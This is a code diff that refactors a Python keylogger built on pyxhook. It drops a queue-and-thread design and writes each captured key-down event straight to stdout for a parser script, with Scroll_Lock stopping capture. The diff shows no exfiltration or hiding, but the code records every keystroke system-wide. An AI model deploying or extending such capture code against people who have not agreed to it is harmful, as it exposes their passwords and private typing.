@@ -32,46 +32,14 @@ import os
 import sys
 import signal
 
-class Logger(threading.Thread):
-    def __init__(self, event_queue):
-        threading.Thread.__init__(self)
-        self.finished = threading.Event()
-        self.q = event_queue
-
-    def run(self):
-        while not self.finished.isSet():
-            self.process_event()
-
-    def cancel(self):
-        self.finished.set() 
-
-    def process_event(self):
-        try:
-            event = self.q.get(timeout=0.05)
-            self.eventkey = event.Key + '\n'
-            p = Process(target=self.write_keycode)
-            p.start()
-            p.join()
-        except queue.Empty:
-            pass
-        except:
-            print(('[WARN] Some exception was caught in the Logger loop...'), file=sys.stderr)
-            pass
-
-    def write_keycode(self):
-        sys.stdout.write(self.eventkey)
-
 class KeyboardLogger:
     def __init__(self):
-        self.queue = queue.Queue(0)
-        self.event_thread = Logger(self.queue)
         self.hm = pyxhook.HookManager()
         self.hm.HookKeyboard()
         self.hm.KeyDown = self.OnKeyDownEvent
 
     def start(self):
         print(('[INFO]Starting Logger thread'), file=sys.stderr)
-        self.event_thread.start()
         self.hm.start()
 
     def OnKeyDownEvent(self, event):
@@ -79,11 +47,16 @@ class KeyboardLogger:
             print('Scroll_Lock')                    # Permit keylog_parser.py to quit properly
             self.stop()
             return
-        self.queue.put(event)
+        self.eventkey = event.Key + '\n'
+        p = Process(target=self.write_keycode)
+        p.start()
+        p.join()
+
+    def write_keycode(self):
+        sys.stdout.write(self.eventkey)
 
     def stop(self):
         self.hm.cancel()
-        self.event_thread.cancel()
         time.sleep(0.2)
         sys.exit()
 
